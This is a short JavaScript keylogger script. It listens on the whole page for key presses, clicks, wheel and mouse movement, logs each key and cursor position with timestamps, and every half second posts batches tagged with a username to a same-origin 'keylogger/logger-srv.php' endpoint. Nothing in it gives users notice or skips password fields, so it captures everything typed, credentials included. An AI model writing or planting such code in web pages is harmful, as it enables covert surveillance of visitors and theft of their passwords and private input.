// Record all key events into an array
var events = [];

function logEvent(evt) {
    console.log(evt);
    var data;
    var x;
    var y;
    let type = evt.type;
    switch(type) {
        case "keydown":
        case "keyup":
            data = evt.key;
            break;
        case "click":
        case "contextmenu":
        case "dblclick":
        case "wheel":
        case "mousemove":
            x = evt.clientX;
            y = evt.clientY;
            break;
    }
    events.push({ time: Date.now(), type: type, data: data, x: x, y: y });
}
window.addEventListener("keydown", logEvent);
window.addEventListener("keyup", logEvent);
window.addEventListener("click", logEvent);
window.addEventListener("contextmenu", logEvent);
window.addEventListener("dblclick", logEvent);
window.addEventListener("wheel", logEvent);
window.addEventListener("mousemove", logEvent);

// Push to server at regular intervals
// Reduce interval timing for more frequent recordings, but increases server load
// You can also set this to send only if certain number of key stroke were made.
window.setInterval(function () {
  if (events.length>5) {
      eventsToSend = events;
      events = [];
      var data = JSON.stringify({ user: username, events: eventsToSend });

      let url = `${window.location.origin}/${web_root}/keylogger/logger-srv.php`;
      fetch(url, { method: 'post', body: data })
      .then(response => response.text())
      .then(data => {
        console.log('[keylogger] Success:', data);
      })
      .catch((error) => {
        // TODO: There is no server error currently.
        console.error('[keylogger] Error:', error);
      });
  }
}, 500);
